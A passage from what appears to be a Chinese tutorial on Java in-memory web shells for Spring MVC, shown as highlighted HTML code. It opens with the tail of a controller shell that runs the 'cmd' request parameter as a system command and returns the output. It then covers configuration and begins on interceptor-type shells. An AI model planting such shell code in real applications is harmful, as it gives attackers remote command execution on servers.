#BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;/c&quot;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getParameter(</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #B392F0\">)&#125;;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">InputStream</span><span style=\"color: #B392F0\"> in </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Runtime</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getRuntime()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">exec(cmds)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getInputStream();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">Scanner</span><span style=\"color: #B392F0\"> s </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> Scanner(in)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">useDelimiter(</span><span style=\"color: #FFAB70\">&quot;\\\\A&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> output </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">s</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">hasNext() </span><span style=\"color: #F97583\">?</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">s</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">next() </span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\"> </span><span style=\"color: #FFAB70\">&quot;&quot;</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">response</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWriter()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">write(output);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #79B8FF\">response</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWriter()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">flush();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span></code></pre></div><p>这里我的版本是 tomcat8   JDK11 然后 spring 版本的是 5，可以复现<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709738213835-98ccdbf1-7cf5-4adf-aeaf-39a29fc85250.png#averageHue=%236d9824&clientId=u9af1806a-7a9b-4&from=paste&height=124&id=ucd52ff9e&originHeight=205&originWidth=2559&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=40796&status=done&style=none&taskId=u908d4aee-1d00-4003-9e9b-ccaebf67e2b&title=&width=1550.9090012689649\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<p>如果师傅们出不来结果，考虑如下几个方面的环境配置<br>springmvc 中的配置是否完整，也即是否扫描了识别了 controller，和是否配置了 springmvc 的注解引擎</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #B392F0\">&lt;?</span><span style=\"color: #FFAB70\">xml</span><span style=\"color: #B392F0\"> version=</span><span style=\"color: #FFAB70\">&quot;1.0&quot;</span><span style=\"color: #B392F0\"> encoding=</span><span style=\"color: #FFAB70\">&quot;UTF-8&quot;</span><span style=\"color: #B392F0\">?&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #FFAB70\">beans</span><span style=\"color: #B392F0\"> xmlns=</span><span style=\"color: #FFAB70\">&quot;http://www.springframework.org/schema/beans&quot;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  xmlns</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #B392F0\">xsi=</span><span style=\"color: #FFAB70\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  xmlns</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #B392F0\">context=</span><span style=\"color: #FFAB70\">&quot;http://www.springframework.org/schema/context&quot;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  xmlns</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #B392F0\">mvc=</span><span style=\"color: #FFAB70\">&quot;http://www.springframework.org/schema/mvc&quot;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  xsi</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #B392F0\">schemaLocation=</span><span style=\"color: #FFAB70\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  </span><span style=\"color: #6B737C\">&lt;!--    解决中文乱码问题的一键式--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">mvc</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #FFAB70\">annotation-driven</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">mvc</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #FFAB70\">message-converters</span><span style=\"color: #B392F0\"> register-defaults=</span><span style=\"color: #FFAB70\">&quot;true&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">      &lt;</span><span style=\"color: #FFAB70\">bean</span><span style=\"color: #B392F0\"> class=</span><span style=\"color: #FFAB70\">&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &lt;</span><span style=\"color: #FFAB70\">property</span><span style=\"color: #B392F0\"> name=</span><span style=\"color: #FFAB70\">&quot;supportedMediaTypes&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">          &lt;</span><span style=\"color: #FFAB70\">list</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;</span><span style=\"color: #FFAB70\">value</span><span style=\"color: #B392F0\">&gt;text/html;charset=UTF-8&lt;/</span><span style=\"color: #FFAB70\">value</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;</span><span style=\"color: #FFAB70\">value</span><span style=\"color: #B392F0\">&gt;application/json;charset=UTF-8&lt;/</span><span style=\"color: #FFAB70\">value</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;</span><span style=\"color: #FFAB70\">value</span><span style=\"color: #B392F0\">&gt;text/plain;charset=UTF-8&lt;/</span><span style=\"color: #FFAB70\">value</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &lt;</span><span style=\"color: #FFAB70\">value</span><span style=\"color: #B392F0\">&gt;application/xml;charset=UTF-8&lt;/</span><span style=\"color: #FFAB70\">value</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">          &lt;/</span><span style=\"color: #FFAB70\">list</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &lt;/</span><span style=\"color: #FFAB70\">property</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">      &lt;/</span><span style=\"color: #FFAB70\">bean</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;/</span><span style=\"color: #FFAB70\">mvc</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #FFAB70\">message-converters</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;/</span><span style=\"color: #FFAB70\">mvc</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #FFAB70\">annotation-driven</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  </span><span style=\"color: #6B737C\">&lt;!--扫描含有注解的controller--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">context</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #FFAB70\">component-scan</span><span style=\"color: #B392F0\"> base-package=</span><span style=\"color: #FFAB70\">&quot;com.stoocea.Controller&quot;</span><span style=\"color: #B392F0\">/&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  </span><span style=\"color: #6B737C\">&lt;!--    静态资源过滤器--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">mvc</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #FFAB70\">default-servlet-handler</span><span style=\"color: #B392F0\"> /&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  </span><span style=\"color: #6B737C\">&lt;!--    SpringMVC的注解引擎--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">mvc</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #FFAB70\">annotation-driven</span><span style=\"color: #B392F0\"> /&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  </span><span style=\"color: #6B737C\">&lt;!--    添加视图解析器--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">bean</span><span style=\"color: #B392F0\"> class=</span><span style=\"color: #FFAB70\">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span><span style=\"color: #B392F0\"> id=</span><span style=\"color: #FFAB70\">&quot;internalResourceViewResolver&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #6B737C\">&lt;!--        前缀--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">property</span><span style=\"color: #B392F0\"> name=</span><span style=\"color: #FFAB70\">&quot;prefix&quot;</span><span style=\"color: #B392F0\"> value=</span><span style=\"color: #FFAB70\">&quot;/WEB-INF/jsp/&quot;</span><span style=\"color: #B392F0\">/&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #6B737C\">&lt;!--        后缀--&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">property</span><span style=\"color: #B392F0\"> name=</span><span style=\"color: #FFAB70\">&quot;suffix&quot;</span><span style=\"color: #B392F0\"> value=</span><span style=\"color: #FFAB70\">&quot;.jsp&quot;</span><span style=\"color: #B392F0\">/&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;/</span><span style=\"color: #FFAB70\">bean</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  </span><span style=\"color: #6B737C\">&lt;!--    Handler--&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;/</span><span style=\"color: #FFAB70\">beans</span><span style=\"color: #B392F0\">&gt;</span></span></code></pre></div><p>web.xml 中是否准备好了 dispatchservlet 的环境准备</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #B392F0\">&lt;?</span><span style=\"color: #FFAB70\">xml</span><span style=\"color: #B392F0\"> version=</span><span style=\"color: #FFAB70\">&quot;1.0&quot;</span><span style=\"color: #B392F0\"> encoding=</span><span style=\"color: #FFAB70\">&quot;UTF-8&quot;</span><span style=\"color: #B392F0\">?&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #FFAB70\">web-app</span><span style=\"color: #B392F0\"> xmlns=</span><span style=\"color: #FFAB70\">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">         xmlns</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #B392F0\">xsi=</span><span style=\"color: #FFAB70\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">         xsi</span><span style=\"color: #BBBBBB\">:</span><span style=\"color: #B392F0\">schemaLocation=</span><span style=\"color: #FFAB70\">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">         version=</span><span style=\"color: #FFAB70\">&quot;4.0&quot;</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">servlet</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">servlet-name</span><span style=\"color: #B392F0\">&gt;springmvc&lt;/</span><span style=\"color: #FFAB70\">servlet-name</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">servlet-class</span><span style=\"color: #B392F0\">&gt;org.springframework.web.servlet.DispatcherServlet&lt;/</span><span style=\"color: #FFAB70\">servlet-class</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">init-param</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">      &lt;</span><span style=\"color: #FFAB70\">param-name</span><span style=\"color: #B392F0\">&gt;contextConfigLocation&lt;/</span><span style=\"color: #FFAB70\">param-name</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">      &lt;</span><span style=\"color: #FFAB70\">param-value</span><span style=\"color: #B392F0\">&gt;classpath:springmvc-servlet.xml&lt;/</span><span style=\"color: #FFAB70\">param-value</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;/</span><span style=\"color: #FFAB70\">init-param</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">load-on-startup</span><span style=\"color: #B392F0\">&gt;1&lt;/</span><span style=\"color: #FFAB70\">load-on-startup</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;/</span><span style=\"color: #FFAB70\">servlet</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;</span><span style=\"color: #FFAB70\">servlet-mapping</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">servlet-name</span><span style=\"color: #B392F0\">&gt;springmvc&lt;/</span><span style=\"color: #FFAB70\">servlet-name</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &lt;</span><span style=\"color: #FFAB70\">url-pattern</span><span style=\"color: #B392F0\">&gt;/&lt;/</span><span style=\"color: #FFAB70\">url-pattern</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">  &lt;/</span><span style=\"color: #FFAB70\">servlet-mapping</span><span style=\"color: #B392F0\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&lt;/</span><span style=\"color: #FFAB70\">web-app</span><span style=\"color: #B392F0\">&gt;</span></span></code></pre></div><h1 id=\"3-interceptor-型内存马\"><a href=\"#3-interceptor-型内存马\" class=\"headerlink\" title=\"3 interceptor 型内存马\"></a>3 interceptor 型内存马</h1><h2 id=\"0x01-什么是-interceptor\"><a href=\"#0x01-什么是-interceptor\" class=\"headerlink\" title=\"0x01 什么是 interceptor\"></a>0x01 什么是 interceptor</h2><p>类比 Tomcat 中的 filter，主要作用是用来拦截用户的请求并做相应的处理，通常就是实现鉴权和记录日志等作用<br>springmvc 中要想实现 interceptor 自定义并不难，可以通过如下两个方式实现：</p>\n<ol>\n<li>通过实现 <code>HandlerInterceptor</code> 接口或者继承 <code>HandlerInterceptor</code> 接口的实现类（比如<code> HandlerInterceptorAdapter</code>）</li>\n<li>通过实现<code>WebRequestInterceptor </code>或者继承 <code> WebRequestInterceptor</code>接口的实现类</li>\n</ol>\n<p>现在来尝试实现一个 Interceptor，采用的方法是直接实现<code>HandlerInterceptor</code>接口，<code>HandlerInterceptor</code>接口本身就有三个方法’</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1709778858494-b85ebdf6-88bf-4b7c-94c1-d9dccc7d1ae2.png#averageHue=%233c454f&clientId=u1acac59a-b2bd-4&from=paste&height=113&id=udaf047ac&originHeight=187&originWidth=787&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=82905&status=done&style=none&taskId=u742da094-486d-4f93-a371-f2650039753&title=&width=476.9696694015925\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<ul>\n<li>preHandle：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。</li>\n<li>postHandle：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。</li>\n<li>afterCompletion：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。</li>\n</ul>\n<p>首先先写一个 interceptor</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HandlerInterceptor</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">http</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">PrintWriter</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> TestInterceptor  </span><span style=\"color: #F97583\">implements</span><span style=\"color: #B392F0\"> HandlerInterceptor &#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    @</span><span style=\"color: #F97583\">Override</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">boolean</span><span style=\"color: #B392F0\"> preHandle(</span><span style=\"color: #F97583\">HttpServletRequest</span><span style=\"color: #B392F0\"> request</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">HttpServletResponse</span><span style=\"color: #B392F0\"> response</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> handler) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> url </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getRequestURI();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">PrintWriter</span><span style=\"color: #B392F0\"> writer </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">response</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getWriter();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">url</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">indexof(</span><span style=\"color: #FFAB70\">&quot;/login&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #F97583\">&gt;=</span><span style=\"color: #F8F8F8\">0</span><span style=\"color: #B392F0\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">write(</span><span style=\"color: #FFAB70\">&quot;loginSuccess&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">flush();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">close();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">write(</span><span style=\"color: #FFAB70\">&quot;LoginFirst&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">flush();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">writer</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">close();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">false</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span></code></pre></div><p>然后在 webmvc 中去注册这个 interceptor</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">&lt;</span><span style=\"color: #B392F0\">mvc</span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\">interceptors</span><span style=\"color: #F97583\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">&lt;</span><span style=\"color: #B392F0\">mvc</span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\">interceptor</span><span style=\"color: #F97583\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">&lt;</span><span style=\"color: #B392F0\">mvc</span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\">mapping path</span><span style=\"color: #F97583\">=</span><span style=\"color: #FFAB70\">&quot;/*&quot;</span><span style=\"color: #F97583\">/&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">&lt;</span><span style=\"color: #B392F0\">bean class</span><span style=\"color: #F97583\">=</span><span style=\"color: #FFAB70\">&quot;com.stoocea.Interceptor.TestInterceptor&quot;</span><span style=\"color: #F97583\">/&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">&lt;/</span><span style=\"color: #B392F0\">mvc</span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\">interceptor</span><span style=\"color: #F97583\">&gt;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">&lt;/</span><span style=\"color: #B392F0\">mvc</span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\">interceptors</span><span style=\"color: #F97583\">&gt;</span></span></code></pre></div><p>然后可以写 两个controller 实验一下</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki min-dark\" style=\"background-color: #1f1f1f\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F97583\">package</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">com</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">stoocea</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Controller</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">stereotype</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Controller</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ui</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Model</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">bind</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">GetMapping</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">springframework</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">bind</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">annotation</span><span style=\"color: 